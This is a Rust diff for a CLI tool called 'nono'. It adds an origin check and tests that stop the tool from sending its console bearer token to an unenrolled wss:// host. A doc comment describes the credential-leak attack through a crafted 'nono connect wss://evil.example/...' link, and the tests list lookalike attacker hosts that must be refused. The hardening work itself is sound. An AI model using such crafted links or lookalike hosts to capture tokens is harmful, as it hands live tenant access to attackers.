@@ -246,6 +246,7 @@ fn resolve_attach_url(target: Option<&str>, console: Option<&str>, token: &str) 
         && matches!(url.scheme(), "ws" | "wss")
     {
         validate_direct_attach_url(&url)?;
+        verify_attach_origin(&url, console)?;
         return Ok(url);
     }
 
@@ -713,6 +714,78 @@ fn validate_direct_attach_url(url: &Url) -> Result<()> {
         ));
     }
     Ok(())
+}
+
+/// Whether `url` names one of the origins already authorized for this device.
+///
+/// Host comparison is by exact ASCII-case-insensitive equality on the parsed
+/// host, never a string prefix: `evil-console.example` and
+/// `console.example.evil.test` must not match `console.example`. Effective
+/// ports must agree. Scheme is deliberately not compared, because an
+/// authorized origin is an `https://` console while the attach URL that same
+/// console issues is `wss://` on that host.
+fn attach_origin_is_authorized(url: &Url, authorized: &[Url]) -> bool {
+    let Some(host) = url.host_str() else {
+        return false;
+    };
+    let port = url.port_or_known_default();
+    authorized.iter().any(|origin| {
+        origin
+            .host_str()
+            .is_some_and(|candidate| candidate.eq_ignore_ascii_case(host))
+            && origin.port_or_known_default() == port
+    })
+}
+
+/// Refuse to hand the console bearer token to an unenrolled origin.
+///
+/// A direct `wss://` target is taken verbatim from the command line, so it can
+/// be a link the operator was sent rather than one the console issued.
+/// `validate_direct_attach_url` only checks the URL's shape; without an origin
+/// check, `nono connect wss://evil.example/api/v1/sessions/...` opens a socket
+/// to an attacker and puts `Authorization: Bearer <console token>` in the
+/// upgrade request, handing over live console access for the tenant.
+///
+/// Fail secure: the destination must be the console named by `--console`, the
+/// enrolled platform, or the console that platform discloses. Anything else is
+/// refused rather than confirmed interactively — a prompt here is answered
+/// under exactly the pretext that motivated the attack.
+fn verify_attach_origin(url: &Url, console: Option<&str>) -> Result<()> {
+    // Loopback remains the documented development exception, as in
+    // `validate_transport_url`. Reaching it already requires local code
+    // execution, which outranks the credential this check protects.
+    if is_loopback(url) {
+        return Ok(());
+    }
+
+    let mut authorized = Vec::new();
+    match console {
+        Some(value) => authorized.push(validate_console_url(value)?),
+        None => {
+            if let Some(state) = crate::platform_client::load_state()?
+                && let Ok(platform) = validate_console_url(&state.platform_url)
+            {
+                authorized.push(platform);
+            }
+            // Only pay for console discovery when the platform itself did not
+            // already account for the target.
+            if attach_origin_is_authorized(url, &authorized) {
+                return Ok(());
+            }
+            authorized.push(discover_console()?);
+        }
+    }
+
+    if attach_origin_is_authorized(url, &authorized) {
+        return Ok(());
+    }
+
+    Err(NonoError::ActionRequired(format!(
+        "refusing to send console credentials to '{}': it is not the enrolled platform or its \
+         console. Run `nono connect` with no target to choose a session from the enrolled console, \
+         or pass --console to name the console that issued this session.",
+        url.host_str().unwrap_or("<no host>")
+    )))
 }
 
 fn is_loopback(url: &Url) -> bool {
@@ -2121,5 +2194,86 @@ mod tests {
         );
         assert!(validate_console_url("https://console.example?token=secret").is_err());
         assert!(validate_console_url("https://user@console.example").is_err());
+    }
+
+    #[test]
+    fn attach_origin_accepts_the_enrolled_console_across_schemes() {
+        let authorized = vec![Url::parse("https://console.example").unwrap()];
+        // The console is https; the terminal URL it issues is wss on that host.
+        assert!(attach_origin_is_authorized(
+            &Url::parse("wss://console.example/api/v1/sessions/abc/terminal").unwrap(),
+            &authorized
+        ));
+        // Host comparison ignores ASCII case, as DNS does.
+        assert!(attach_origin_is_authorized(
+            &Url::parse("wss://Console.Example/api/v1/sessions/abc/terminal").unwrap(),
+            &authorized
+        ));
+    }
+
+    #[test]
+    fn attach_origin_rejects_unenrolled_and_lookalike_hosts() {
+        let authorized = vec![Url::parse("https://console.example").unwrap()];
+        for hostile in [
+            // Plainly unrelated.
+            "wss://evil.com/api/v1/sessions/abc/terminal",
+            // Suffix that a naive `starts_with` on the authorized host admits.
+            "wss://console.example.evil.test/api/v1/sessions/abc/terminal",
+            // Prefix that a naive `ends_with` admits.
+            "wss://evil-console.example.attacker.test/api/v1/sessions/abc/terminal",
+            // Right host, wrong port: a different service on shared infra.
+            "wss://console.example:8443/api/v1/sessions/abc/terminal",
+        ] {
+            assert!(
+                !attach_origin_is_authorized(&Url::parse(hostile).unwrap(), &authorized),
+                "must refuse credentials to {hostile}"
+            );
+        }
+    }
+
+    #[test]
+    fn attach_origin_rejects_everything_when_nothing_is_authorized() {
+        assert!(!attach_origin_is_authorized(
+            &Url::parse("wss://console.example/api/v1/sessions/abc/terminal").unwrap(),
+            &[]
+        ));
+    }
+
+    #[test]
+    fn attach_origin_check_allows_loopback_development_targets() {
+        // Reaches the loopback exception without consulting enrollment state,
+        // matching the development carve-out in `validate_transport_url`.
+        assert!(
+            verify_attach_origin(&Url::parse("ws://127.0.0.1:8080/terminal").unwrap(), None)
+                .is_ok()
+        );
+        assert!(
+            verify_attach_origin(&Url::parse("ws://localhost:8080/terminal").unwrap(), None)
+                .is_ok()
+        );
+    }
+
+    #[test]
+    fn attach_origin_refuses_host_not_matching_explicit_console() {
+        let error = verify_attach_origin(
+            &Url::parse("wss://evil.com/api/v1/sessions/abc/terminal").unwrap(),
+            Some("https://console.example"),
+        )
+        .expect_err("an unenrolled host must be refused");
+        assert!(
+            matches!(error, NonoError::ActionRequired(_)),
+            "expected an actionable refusal, got {error:?}"
+        );
+    }
+
+    #[test]
+    fn attach_origin_accepts_host_matching_explicit_console() {
+        assert!(
+            verify_attach_origin(
+                &Url::parse("wss://console.example/api/v1/sessions/abc/terminal").unwrap(),
+                Some("https://console.example"),
+            )
+            .is_ok()
+        );
     }
 }
